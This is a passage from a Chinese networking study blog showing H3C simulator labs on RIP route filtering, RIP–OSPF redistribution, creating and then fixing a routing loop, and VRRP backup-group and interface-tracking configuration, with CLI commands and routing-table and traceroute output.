class="line">Destinations : 20       Routes : 20</span><br><span class="line"></span><br><span class="line">Destination/Mask   Proto   Pre Cost        NextHop         Interface</span><br><span class="line">... ...</span><br><span class="line">10.0.1.0/24        RIP     100 1           192.168.1.5     GE5/0</span><br><span class="line">10.1.0.0/24        RIP     100 3           192.168.1.5     GE5/0</span><br><span class="line">10.1.1.0/24        RIP     100 3           192.168.1.5     GE5/0</span><br><span class="line">192.168.1.0/30     RIP     100 1           192.168.1.5     GE5/0</span><br><span class="line">... ...</span><br></pre></td></tr></table></figure>

<p>可见，<code>RTA</code>将引入的路由<strong>10.1.0.0&#x2F;24</strong>、<strong>10.1.1.0&#x2F;24</strong>发布给<code>RTB</code>、<code>RTC</code>，度量值为3（缺省值加1）。</p>
<p>在<code>RTA</code>上配置route-policy，仅引入路由<strong>10.1.0.0&#x2F;24</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[RTA]ip prefix-list pre1 index 10 permit 10.1.0.0 24</span><br><span class="line">[RTA]route-policy rou1 permit node 10</span><br><span class="line">[RTA-route-policy-rou1-10]if-match ip address prefix-list pre1</span><br><span class="line">[RTA-route-policy-rou1-10]quit</span><br><span class="line"></span><br><span class="line">[RTA]rip 1</span><br><span class="line">[RTA-rip-1]import-route static route-policy rou1</span><br></pre></td></tr></table></figure>

<p>配置完成后在<code>RTB</code>、<code>RTC</code>上查看路由表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[RTB]dis ip routing-table</span><br><span class="line"></span><br><span class="line">Destinations : 19       Routes : 19</span><br><span class="line"></span><br><span class="line">Destination/Mask   Proto   Pre Cost        NextHop         Interface</span><br><span class="line">... ...</span><br><span class="line">10.0.1.0/24        RIP     100 1           192.168.1.1     GE5/0</span><br><span class="line">10.1.0.0/24        RIP     100 3           192.168.1.1     GE5/0</span><br><span class="line">192.168.1.4/30     RIP     100 1           192.168.1.1     GE5/0</span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[RTC]dis ip routing-table</span><br><span class="line"></span><br><span class="line">Destinations : 19       Routes : 19</span><br><span class="line"></span><br><span class="line">Destination/Mask   Proto   Pre Cost        NextHop         Interface</span><br><span class="line">... ...</span><br><span class="line">10.0.1.0/24        RIP     100 1           192.168.1.5     GE5/0</span><br><span class="line">10.1.0.0/24        RIP     100 3           192.168.1.5     GE5/0</span><br><span class="line">192.168.1.0/30     RIP     100 1           192.168.1.5     GE5/0</span><br><span class="line">... ...</span><br></pre></td></tr></table></figure>

<p>可见，<code>RTA</code>只将路由<strong>10.1.0.0&#x2F;24</strong>发布给<code>RTB</code>、<code>RTC</code>，而路由<strong>10.1.1.0&#x2F;24</strong>在引入时被过滤掉。</p>
<h3 id="路由重分发"><a href="#路由重分发" class="headerlink" title="路由重分发"></a>路由重分发</h3><p>在<code>RTB</code>、<code>RTC</code>上配置双边引入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># RTB的rip中引入ospf</span><br><span class="line">[RTB-rip-1]import-route ospf</span><br><span class="line"></span><br><span class="line"># RTC的ospf中引入rip</span><br><span class="line">[RTC-ospf-1]import-route rip</span><br></pre></td></tr></table></figure>

<p>配置完成后在<code>RTA</code>、<code>RTD</code>上查看路由表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[RTA]dis ip routing-table</span><br><span class="line"></span><br><span class="line">Destinations : 24       Routes : 24</span><br><span class="line"></span><br><span class="line">Destination/Mask   Proto   Pre Cost        NextHop         Interface</span><br><span class="line">... ...</span><br><span class="line">10.0.2.0/24        RIP     100 1           192.168.1.2     GE5/0</span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[RTD]dis ip routing-table</span><br><span class="line"></span><br><span class="line">Destinations : 23       Routes : 23</span><br><span class="line"></span><br><span class="line">Destination/Mask   Proto   Pre Cost        NextHop         Interface</span><br><span class="line">... ...</span><br><span class="line">10.0.1.0/24        O_ASE2  150 1           192.168.2.5     GE5/1</span><br><span class="line">10.1.0.0/24        O_ASE2  150 1           192.168.2.5     GE5/1</span><br><span class="line">... ...</span><br></pre></td></tr></table></figure>

<p>可见<code>RTA</code>学到了<strong>10.0.2.0&#x2F;24</strong>网段，<code>RTD</code>也学到了<strong>10.0.1.0&#x2F;24</strong>和<strong>10.1.0.0&#x2F;24</strong>网段。</p>
<h3 id="制造环路"><a href="#制造环路" class="headerlink" title="制造环路"></a>制造环路</h3><p>配置了路由边界引入后，在某些情况下可能会导致路由环路或错误。下面人为制造环路：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 在RTA上将静态路由的优先级设置为120</span><br><span class="line">[RTA]ip route-static 10.1.0.0 24 10.0.1.2 preference 120</span><br><span class="line"># 在RTB上将rip优先级设置为200，使RTB能将RTD学到的10.1.0.0/24路由向rip域发布</span><br><span class="line">[RTB-rip-1]preference 200</span><br></pre></td></tr></table></figure>

<p>配置完成后在<code>RTA</code>上查看路由表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[RTA]dis ip routing-table</span><br><span class="line"></span><br><span class="line">Destinations : 24       Routes : 24</span><br><span class="line"></span><br><span class="line">Destination/Mask   Proto   Pre Cost        NextHop         Interface</span><br><span class="line">... ...</span><br><span class="line">10.1.0.0/24        RIP     100 1           192.168.1.2     GE5/0</span><br><span class="line">... ...</span><br></pre></td></tr></table></figure>

<p>可见<code>RTA</code>上优先级100的rip路由更新掉了优先级120的静态路由。此时，<code>RTA</code>认为通过<code>RTB</code>可以到达<strong>10.1.0.0&#x2F;24</strong>网段，<code>RTB</code>又认为可以通过<code>RTD</code>可以到达，同时<code>RTD</code>认为可以通过<code>RTC</code>可以到达，<code>RTC</code>又认为可以通过<code>RTA</code>可以到达，于是环路产生了。</p>
<p>此时在<code>RTA</code>上查看到达<strong>10.1.0.0&#x2F;24</strong>网段的路径：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;RTA&gt;tracert 10.1.0.1</span><br><span class="line">traceroute to 10.1.0.1 (10.1.0.1), 30 hops at most, 40 bytes each packet, press CTRL_C to break</span><br><span class="line"> 1  192.168.1.2 (192.168.1.2)  1.000 ms  1.000 ms  2.000 ms</span><br><span class="line"> 2  192.168.2.2 (192.168.2.2)  3.000 ms  2.000 ms  2.000 ms</span><br><span class="line"> 3  192.168.2.5 (192.168.2.5)  3.000 ms  2.000 ms  2.000 ms</span><br><span class="line"> 4  192.168.1.5 (192.168.1.5)  2.000 ms  3.000 ms  2.000 ms</span><br><span class="line"> 5  192.168.1.2 (192.168.1.2)  3.000 ms  3.000 ms  3.000 ms</span><br><span class="line"> 6  192.168.2.2 (192.168.2.2)  5.000 ms  4.000 ms  4.000 ms</span><br><span class="line"> 7  192.168.2.5 (192.168.2.5)  5.000 ms  3.000 ms  4.000 ms</span><br><span class="line"> 8  192.168.1.5 (192.168.1.5)  5.000 ms  5.000 ms  4.000 ms</span><br><span class="line"> 9  192.168.1.2 (192.168.1.2)  5.000 ms  5.000 ms  5.000 ms</span><br><span class="line">10  192.168.2.2 (192.168.2.2)  8.000 ms  5.000 ms  5.000 ms</span><br><span class="line">11  192.168.2.5 (192.168.2.5)  7.000 ms  7.000 ms  7.000 ms</span><br><span class="line">12  192.168.1.5 (192.168.1.5)  6.000 ms  6.000 ms  8.000 ms</span><br><span class="line">13  192.168.1.2 (192.168.1.2)  7.000 ms  9.000 ms *</span><br><span class="line">14  192.168.2.2 (192.168.2.2)  18.000 ms  17.000 ms  17.000 ms</span><br><span class="line">15  192.168.2.5 (192.168.2.5)  19.000 ms  18.000 ms  17.000 ms</span><br><span class="line">16  192.168.1.5 (192.168.1.5)  17.000 ms  17.000 ms  16.000 ms</span><br><span class="line">17  * 192.168.1.2 (192.168.1.2)  20.000 ms  19.000 ms</span><br><span class="line">18  192.168.2.2 (192.168.2.2)  24.000 ms  26.000 ms  21.000 ms</span><br><span class="line">19  192.168.2.5 (192.168.2.5)  9.000 ms  8.000 ms  6.000 ms</span><br><span class="line">20  192.168.1.5 (192.168.1.5)  8.000 ms  9.000 ms  5.000 ms</span><br><span class="line">21  192.168.1.2 (192.168.1.2)  9.000 ms  11.000 ms  11.000 ms</span><br><span class="line">22  192.168.2.2 (192.168.2.2)  15.000 ms  13.000 ms  13.000 ms</span><br><span class="line">23  192.168.2.5 (192.168.2.5)  14.000 ms  12.000 ms  10.000 ms</span><br><span class="line">24  192.168.1.5 (192.168.1.5)  13.000 ms  14.000 ms  12.000 ms</span><br><span class="line">25  192.168.1.2 (192.168.1.2)  12.000 ms  14.000 ms  12.000 ms</span><br><span class="line">26  192.168.2.2 (192.168.2.2)  12.000 ms  13.000 ms  13.000 ms</span><br><span class="line">27  192.168.2.5 (192.168.2.5)  14.000 ms  15.000 ms  14.000 ms</span><br><span class="line">28  192.168.1.5 (192.168.1.5)  15.000 ms  15.000 ms  14.000 ms</span><br><span class="line">29  192.168.1.2 (192.168.1.2)  15.000 ms  16.000 ms  16.000 ms</span><br><span class="line">30  192.168.2.2 (192.168.2.2)  17.000 ms  18.000 ms  18.000 ms</span><br><span class="line">!Destination not found inside Max Hop Count.</span><br></pre></td></tr></table></figure>

<h3 id="避免环路"><a href="#避免环路" class="headerlink" title="避免环路"></a>避免环路</h3><p>由于<code>RTB</code>在引入OSPF路由时不加任何选择，因此出现了上面的环路错误。</p>
<p>可以通过配置route-policy对引入的路由加以选择，避免环路的产生：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 在RTC配置引入的ospf路由条目打上tag10</span><br><span class="line">[RTC-rip-1]import-route ospf tag 10</span><br><span class="line"></span><br><span class="line"># 在RTB配置不引入tag为10的ospf路由条目</span><br><span class="line">[RTB]route-policy rou2 deny node 10</span><br><span class="line">[RTB-route-policy-rou2-10]if-match tag 10</span><br><span class="line">[RTB]route-policy rou2 permit node 20</span><br><span class="line"></span><br><span class="line">[RTB]rip 1</span><br><span class="line">[RTB-rip-1]import-route ospf route-policy rou2</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>此时再从<code>RTA</code>上查看路由表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;RTA&gt;dis ip ro</span><br><span class="line"></span><br><span class="line">Destinations : 24       Routes : 24</span><br><span class="line"></span><br><span class="line">Destination/Mask   Proto   Pre Cost        NextHop         Interface</span><br><span class="line">... ...</span><br><span class="line">10.1.0.0/24        Static  120 0           10.0.1.2        GE0/0</span><br><span class="line">... ...</span><br></pre></td></tr></table></figure>

<p>可以看到，优先级为120的<strong>10.1.0.0&#x2F;24</strong>网段静态路由又出现在了路由表中。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li>H3C A00500010 路由过滤</li>
<li>H3C A00500020 路由策略</li>
</ol>
]]></content>
      <tags>
        <tag>信息网络</tag>
        <tag>H3C</tag>
        <tag>路由过滤</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息网络学习day13 H3C设备配置VRRP】</title>
    <url>/1031/</url>
    <content><![CDATA[<p>通常，同一网段内的所有主机都设置一条相同的以网关为下一跳的缺省路由。当网关发生故障时，本网段内所有以网关为缺省路由的主机将无法与外部网络通信。</p>
<p>通过VRRP可以避免由于局域网网关单点故障而导致的网络中断。</p>
<p>在H3C模拟器上进行VRRP的配置，包括<strong>单备份组配置</strong>、<strong>监视接口配置</strong>、<strong>双备份组配置</strong>，系统版本v7。</p>
<span id="more"></span>

<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h2 id="VRRP概念"><a href="#VRRP概念" class="headerlink" title="VRRP概念"></a>VRRP概念</h2><ul>
<li><p>RFC 3768定义的VRRPv2是一种容错协议，在提高可靠性的同时，简化了主机的配置。</p>
</li>
<li><p>VRRP协议报文使用固定的组播地址224.0.0.18进行发送。</p>
</li>
<li><p>虚拟路由器由LAN上唯一的Virtual Router ID标识。并具有虚MAC地址：00-00-5E-00-01-{vrid}。</p>
</li>
</ul>
<h2 id="VRRP主备备份"><a href="#VRRP主备备份" class="headerlink" title="VRRP主备备份"></a>VRRP主备备份</h2><p><img src="/1031/1.PNG"></p>
<ul>
<li><p>VRRP将可以将多个路由器加入到备份组中，形成一台虚拟路由器，承担网关功能。</p>
</li>
<li><p>只要备份组中仍有一台路由正常工作，虚拟路由器就仍然正常工作。</p>
</li>
</ul>
<h2 id="VRRP负载分担"><a href="#VRRP负载分担" class="headerlink" title="VRRP负载分担"></a>VRRP负载分担</h2><p><img src="/1031/2.PNG"></p>
<ul>
<li>VRRP将多台路由器同时承担业务，形成多台虚拟路由器，分担内网与外网之间的流量。</li>
</ul>
<h2 id="VRRP选举"><a href="#VRRP选举" class="headerlink" title="VRRP选举"></a>VRRP选举</h2><p><img src="/1031/3.PNG"></p>
<p>当路由器使能VRRP功能后，会根据优先级确定自己在备份组中的角色。当优先级变化后，根据VRRP模式确认VRRP状态。</p>
<ul>
<li><p>在非抢占模式下。即使配置backup更高的优先级，也不会迁移master。</p>
</li>
<li><p>抢占模式下，谁大谁优先。</p>
</li>
</ul>
<h2 id="VRRP监视接口功能"><a href="#VRRP监视接口功能" class="headerlink" title="VRRP监视接口功能"></a>VRRP监视接口功能</h2><p><img src="/1031/4.PNG"></p>
<ul>
<li>当Master路由器连接上行链路的接口处于Down状态时，路由器主动降低自己的优先级，使得备份组内重新选择Master，承担转发任务。</li>
</ul>
<h1 id="单备份组配置"><a href="#单备份组配置" class="headerlink" title="单备份组配置"></a>单备份组配置</h1><h2 id="拓扑"><a href="#拓扑" class="headerlink" title="拓扑"></a>拓扑</h2><p>按下图拓扑连接，配置各端口ip，并启用rip协议，版本号<code>ver 2</code>，并关闭自动汇总<code>undo summary</code>，并在<code>SWA</code>、<code>SWB</code>的rip进程中将vlan10设置为静默端口。</p>
<p><img src="/1031/5.PNG"></p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>在<code>SWA</code>上配置VRRP单备份组1虚拟IP，优先级120，抢占模式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SWA]int vlan 10</span><br><span class="line">[SWA-Vlan-interface10]vrrp vrid 1 virtual-ip 192.168.0.254</span><br><span class="line">[SWA-Vlan-interface10]vrrp vrid 1 priority 120</span><br><span class="line">[SWA-Vlan-interface10]vrrp vrid 1 preempt-mode</span><br></pre></td></tr></table></figure>

<p>在<code>SWB</code>上配置VRRP单备份组1虚拟IP，优先级100，抢占模式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SWB]int vlan 10</span><br><span class="line">[SWB-Vlan-interface10]vrrp vrid 1 virtual-ip 192.168.0.254</span><br><span class="line">[SWB-Vlan-interface10]vrrp vrid 1 priority 100</span><br><span class="line">[SWB-Vlan-interface10]vrrp vrid 1 preempt-mode</span><br></pre></td></tr></table></figure>

<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>在<code>PCA</code>上tracert<code>PCC</code>，可以看出报文通过<strong>SWA</strong>转发：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[PCA]tracert 10.0.0.1</span><br><span class="line">traceroute to 10.0.0.1 (10.0.0.1), 30 hops at most, 40 bytes each packet, press CTRL_C to break</span><br><span class="line"> 1  192.168.0.252 (192.168.0.252)  2.000 ms  3.000 ms  2.000 ms</span><br><span class="line"> 2  192.168.255.2 (192.168.255.2)  3.000 ms  3.000 ms  4.000 ms</span><br><span class="line"> 3  10.0.0.1 (10.0.0.1)  4.000 ms  4.000 ms  5.000 ms</span><br></pre></td></tr></table></figure>

<p>此时<code>SWA</code>、<code>SWB</code>的VRRP端口表项如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SWA]dis vrrp verbose</span><br><span class="line">IPv4 virtual router information:</span><br><span class="line"> Running mode : Standard</span><br><span class="line"> Total number of virtual routers : 1</span><br><span class="line">   Interface Vlan-interface10</span><br><span class="line">     VRID             : 1                   Adver timer  : 100 centiseconds</span><br><span class="line">     Admin status     : Up                  State        : Master</span><br><span class="line">     Config pri       : 120                 Running pri  : 120</span><br><span class="line">     Preempt mode     : Yes                 Delay time   : 0 centiseconds</span><br><span class="line">     Auth type        : None</span><br><span class="line">     Virtual IP       : 192.168.0.254</span><br><span class="line">     Virtual MAC      : 0000-5e00-0101</span><br><span class="line">     Master IP        : 192.168.0.252</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[SWB]dis vrrp verbose</span><br><span class="line">IPv4 virtual router information:</span><br><span class="line"> Running mode : Standard</span><br><span class="line"> Total number of virtual routers : 1</span><br><span class="line">   Interface Vlan-interface10</span><br><span class="line">     VRID             : 1                   Adver timer  : 100 centiseconds</span><br><span class="line">     Admin status     : Up                  State        : Backup</span><br><span class="line">     Config pri       : 100                 Running pri  : 100</span><br><span class="line">     Preempt mode     : Yes                 Delay time   : 0 centiseconds</span><br><span class="line">     Become master    : 2930 millisecond left</span><br><span class="line">     Auth type        : None</span><br><span class="line">     Virtual IP       : 192.168.0.254</span><br><span class="line">     Master IP        : 192.168.0.252</span><br></pre></td></tr></table></figure>

<p>即<code>SWA</code>为主，<code>SWB</code>为备。</p>
<p>接下来在<code>SWA</code>上关闭与<code>SWC</code>相连的g1&#x2F;0&#x2F;2端口：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SWA]int g1/0/2</span><br><span class="line">[SWA-GigabitEthernet1/0/2]shutdown</span><br></pre></td></tr></table></figure>

<p>此时再从<code>PCA</code>上tracert<code>PCC</code>，可以看出报文转由<strong>SWB</strong>转发：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[PCA]tracert 10.0.0.1</span><br><span class="line">traceroute to 10.0.0.1 (10.0.0.1), 30 hops at most, 40 bytes each packet, press CTRL_C to break</span><br><span class="line"> 1  192.168.0.253 (192.168.0.253)  2.000 ms  2.000 ms  1.000 ms</span><br><span class="line"> 2  192.168.255.6 (192.168.255.6)  4.000 ms  3.000 ms  4.000 ms</span><br><span class="line"> 3  10.0.0.1 (10.0.0.1)  4.000 ms  4.000 ms  5.000 ms</span><br></pre></td></tr></table></figure>

<p>此时<code>SWA</code>、<code>SWB</code>的VRRP端口表项如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SWA]dis vrrp verbose</span><br><span class="line">IPv4 virtual router information:</span><br><span class="line"> Running mode : Standard</span><br><span class="line"> Total number of virtual routers : 1</span><br><span class="line">   Interface Vlan-interface10</span><br><span class="line">     VRID             : 1                   Adver timer  : 100 centiseconds</span><br><span class="line">     Admin status     : Up                  State        : Initialize</span><br><span class="line">     Config pri       : 120                 Running pri  : 120</span><br><span class="line">     Preempt mode     : Yes                 Delay time   : 0 centiseconds</span><br><span class="line">     Auth type        : None</span><br><span class="line">     Virtual IP       : 192.168.0.254</span><br><span class="line">     Master IP        : 0.0.0.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[SWB]dis vrrp verbose</span><br><span class="line">IPv4 virtual router information:</span><br><span class="line"> Running mode : Standard</span><br><span class="line"> Total number of virtual routers : 1</span><br><span class="line">   Interface Vlan-interface10</span><br><span class="line">     VRID             : 1                   Adver timer  : 100 centiseconds</span><br><span class="line">     Admin status     : Up                  State        : Master</span><br><span class="line">     Config pri       : 100                 Running pri  : 100</span><br><span class="line">     Preempt mode     : Yes                 Delay time   : 0 centiseconds</span><br><span class="line">     Auth type        : None</span><br><span class="line">     Virtual IP       : 192.168.0.254</span><br><span class="line">     Virtual MAC      : 0000-5e00-0101</span><br><span class="line">     Master IP        : 192.168.0.253</span><br></pre></td></tr></table></figure>

<p>即<code>SWA</code>为Initialize状态不参与转发，<code>SWB</code>为主。</p>
<h1 id="监视接口配置"><a href="#监视接口配置" class="headerlink" title="监视接口配置"></a>监视接口配置</h1><h2 id="拓扑-1"><a href="#拓扑-1" class="headerlink" title="拓扑"></a>拓扑</h2><p>按下图拓扑连接，配置各端口ip，并启用rip协议，版本号<code>ver 2</code>，并关闭自动汇总<code>undo summary</code>，并在<code>SWA</code>、<code>SWB</code>的rip进程中将vlan10、vlan20设置为静默端口。</p>
<p><img src="/1031/5.PNG"></p>
<h2 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h2><p>在<code>SWA</code>上配置VRRP单备份组1虚拟IP，优先级120，抢占模式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SWA]int vlan 10</span><br><span class="line">[SWA-Vlan-interface10]vrrp vrid 1 virtual-ip 192.168.0.254</span><br><span class="line">[SWA-Vlan-interface10]vrrp vrid 1 priority 120</span><br><span class="line">[SWA-Vlan-interface10]vrrp vrid 1 preempt-mode</span><br></pre></td></tr></table></figure>

<p>在<code>SWB</code>上配置VRRP单备份组1虚拟IP，优先级100，抢占模式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SWB]int vlan 10</span><br><span class="line">[SWB-Vlan-interface10]vrrp vrid 1 virtual-ip 192.168.0.254</span><br><span class="line">[SWB-Vlan-interface10]vrrp vrid 1 priority 100</span><br><span class="line">[SWB-Vlan-interface10]vrrp vrid 1 preempt-mode</span><br></pre></td></tr></table></figure>

<p>在<code>SWA</code>上配置VRRP监视端口：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SWA]track 1 interface Vlan-interface 100</span><br><span class="line"></span><br><span class="line">[SWA]int vlan 10</span><br><span class="line">[SWA-Vlan-interface10]vrrp vrid 1 track 1 priority reduced 30</span><br></pre></td></tr></table></figure>

<h2 id="验证-1"><a href="#验证-1" class="headerlink" title="验证"></a>验证</h2><p>配置VRRP监视端口前，断掉vlan100，<code>PCA</code>tracert<code>PCC</code>不通：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;PCA&gt;tracert 10.0.0.1</span><br><span class="line">traceroute to 10.0.0.1 (10.0.0.1), 30 hops at most, 40 bytes each packet, press CTRL_C to break</span><br><span class="line"> 1  192.168.0.252 (192.168.0.252)  3.000 ms  2.000 ms  1.000 ms</span><br><span class="line"> 2  192.168.0.252 (192.168.0.252)  2.000 ms !N  3.000 ms !N  2.000 ms !N</span><br></pre></td></tr></table></figure>

<p>此时<code>SWA</code>、<code>SWB</code>的VRRP端口表项如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SWA]dis vrrp verbose</span><br><span class="line">IPv4 virtual router information:</span><br><span class="line"> Running mode : Standard</span><br><span class="line"> Total number of virtual routers : 1</span><br><span class="line">   Interface Vlan-interface10</span><br><span class="line">     VRID             : 1                   Adver timer  : 100 centiseconds</span><br><span class="line">     Admin status     : Up                  State        : Master</span><br><span class="line">     Config pri       : 120                 Running pri  : 120</span><br><span class="line">     Preempt mode     : Yes                 Delay time   : 0 centiseconds</span><br><span class="line">     Auth type        : None</span><br><span class="line">     Virtual IP       : 192.168.0.254</span><br><span class="line">     Virtual MAC      : 0000-5e00-0101</span><br><span class="line">     Master IP        : 192.168.0.252</span><br><span class="line">   VRRP track information:</span><br><span class="line">     Track object   : 1                   State : Positive   Pri reduced : 30</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[SWB]dis vrrp verbose</span><br><span class="line">IPv4 virtual router information:</span><br><span class="line"> Running mode : Standard</span><br><span class="line"> Total number of virtual routers : 1</span><br><span class="line">   Interface Vlan-interface10</span><br><span class="line">     VRID             : 1                   Adver timer  : 100 centiseconds</span><br><span class="line">     Admin status     : Up                  State        : Backup</span><br><span class="line">     Config pri       : 100                 Running pri  : 100</span><br><span class="line">     Preempt mode     : Yes                 Delay time   : 0 centiseconds</span><br><span class="line">     Become master    : 2930 millisecond left</span><br><span class="line">     Auth type        : None</span><br><span class="line">     Virtual IP       : 192.168.0.254</span><br><span class="line">     Master IP        : 192.168.0.252</span><br></pre></td></tr></table></figure>

<p>即<code>SWA</code>仍为主，优先级120；<code>SWB</code>为备，优先级100。</p>
<p>配置监视端口后，断掉vlan100，此时再从<code>PCA</code>上tracert<code>PCC</code>，可以看出报文转由<strong>SWB</strong>转发：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[PCA]tracert 10.0.0.1</span><br><span class="line">traceroute to 10.0.0.1 (10.0.0.1), 30 hops at most, 40 bytes each packet, press CTRL_C to break</span><br><span class="line"> 1  192.168.0.253 (192.168.0.253)  2.000 ms  2.000 ms  1.000 ms</span><br><span class="line"> 2  192.168.255.6 (192.168.255.6)  4.000 ms  3.000 ms  4.000 ms</span><br><span class="line"> 3  10.0.0.1 (10.0.0.1)  4.000 ms  4.000 ms  5.000 ms</span><br></pre></td></tr></table></figure>

<p>此时<code>SWA</code>、<code>SWB</code>的VRRP端口表项如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SWA]dis vrrp verbose</span><br><span class="line">IPv4 virtual router information:</span><br><span class="line"> Running mode : Standard</span><br><span class="line"> Total number of virtual routers : 1</span><br><span class="line">   Interface Vlan-interface10</span><br><span class="line">     VRID             : 1                   Adver timer  : 100 centiseconds</span><br><span class="line">     Admin status     : Up                  State        : Backup</span><br><span class="line">     Config pri       : 120                 Running pri  : 90</span><br><span class="line">     Preempt mode     : Yes                 Delay time   : 0 centiseconds</span><br><span class="line">     Become master    : 3090 millisecond left</span><br><span class="line">     Auth type        : None</span><br><span class="line">     Virtual IP       : 192.168.0.254</span><br><span class="line">     Master IP        : 192.168.0.253</span><br><span class="line">   VRRP track information:</span><br><span class="line">     Track object   : 1                   State : Negative   Pri reduced : 30</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[SWB]dis vrrp verbose</span><br><span class="line">IPv4 virtual router information:</span><br><span class="line"> Running mode : Standard</span><br><span class="line"> Total number of virtual routers : 1</span><br><span class="line">   Interface Vlan-interface10</span><br><span class="line">     VRID             : 1                   Adver timer  : 100 centiseconds</span><br><span class="line">     Admin status     : Up                  State        : Master</span><br><span class="line">     Config pri       : 100                 Running pri  : 100</span><br><span class="line">     Preempt mode     : Yes                 Delay time   : 0 centiseconds</span><br><span class="line">     Auth type        : None</span><br><span class="line">     Virtual IP       : 192.168.0.254</span><br><span class="line">     Virtual MAC      : 0000-5e00-0101</span><br><span class="line">     Master IP        : 192.168.0.253</span><br></pre></td></tr></table></figure>

<p>可见VRRP状态发生了迁移，<code>SWA</code>的优先级减了30，变成了备；<code>SWB</code>为主，优先级100。</p>
<h1 id="双备份组配置"><a href="#双备份组配置" class="headerlink" title="双备份组配置"></a>双备份组配置</h1><h2 id="拓扑-2"><a href="#拓扑-2" class="headerlink" title="拓扑"></a>拓扑</h2><p>按下图拓扑连接，配置各端口ip，并启用rip协议，版本号<code>ver 2</code>，并关闭自动汇总<code>undo summary</code>，并在<code>SWA</code>、<code>SWB</code>的rip进程中将vlan10、vlan20设置为静默端口。</p>
<p><img src="/1031/5.PNG"></p>
<h2 id="配置-2"><a href="#配置-2" class="headerlink" title="配置"></a>配置</h2><p>在<code>SWA</code>上配置VRRP备份组1虚拟IP，优先级120，备份组2虚拟IP，优先级100，均为抢占模式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SWA]int vlan 10</span><br><span class="line">[SWA-Vlan-interface10]vrrp vrid 1 virtual-ip 192.168.0.254</span><br><span class="line">[SWA-Vlan-interface10]vrrp vrid 1 priority 120</span><br><span class="line">[SWA-Vlan-interface10]vrrp vrid 1 preempt-mode</span><br><span class="line"></span><br><span class="line">[SWA]int vlan 20</span><br><span class="line">[SWA-Vlan-interface10]vrrp vrid 2 virtual-ip 192.168.1.254</span><br><span class="line">[SWA-Vlan-interface10]vrrp vrid 2 priority 100</span><br><span class="line">[SWA-Vlan-interface10]vrrp vrid 2 preempt-mode</span><br></pre></td></tr></table></figure>

<p>在<code>SWB</code>上配置VRRP备份组1虚拟IP，优先级100，备份组2虚拟IP，优先级120，均为抢占模式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SWB]int vlan 10</span><br><span class="line">[SWB-Vlan-interface10]vrrp vrid 1 virtual-ip 192.168.0.254</span><br><span class="line">[SWB-Vlan-interface10]vrrp vrid 1 priority 100</span><br><span class="line">[SWB-Vlan-interface10]vrrp vrid 1 preempt-mode</span><br><span class="line"></span><br><span class="line">[SWB]int vlan 20</span><br><span class="line">[SWB-Vlan-interface10]vrrp vrid 2 virtual-ip 192.168.1.254</span><br><span class="line">[SWB-Vlan-interface10]vrrp vrid 2 priority 120</span><br><span class="line">[SWB-Vlan-interface10]vrrp vrid 2 preempt-mode</span><br></pre></td></tr></table></figure>

<h2 id="验证-2"><a href="#验证-2" class="headerlink" title="验证"></a>验证</h2><p>配置没问题，死活不通。</p>
<p>老子不玩了 操</p>
<p><strong>———————–2019.8.8更新—————————-</strong></p>
<p>找到问题了，实验三中新加的PCB<strong>192.168.1.0&#x2F;24</strong>网段，在rip中发布网段<strong>192.168.0.0</strong>其实不包含的，所以要在<code>SWA</code>、<code>SWB</code>中再发布一次。</p>
<p>其实看一下路由表就行了，主要昨天坑太多心态崩了。</p>
<p>另外，每次逻辑链路（int vlan 100）通断切换主备时，都可能会导致能ping通但是tracert中间某一跳回不来。原因是rip更新路由表实在太慢了，tracert中间某一跳可能对应的路由条目刚好是中断链路对应的那一条，而这个路由条目要等好久才能消失（我这里&gt;&#x3D;3分钟）。</p>
<h1 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h1><p>要使用H3C设备的tracert功能，需在设备上开启相应功能：</p>
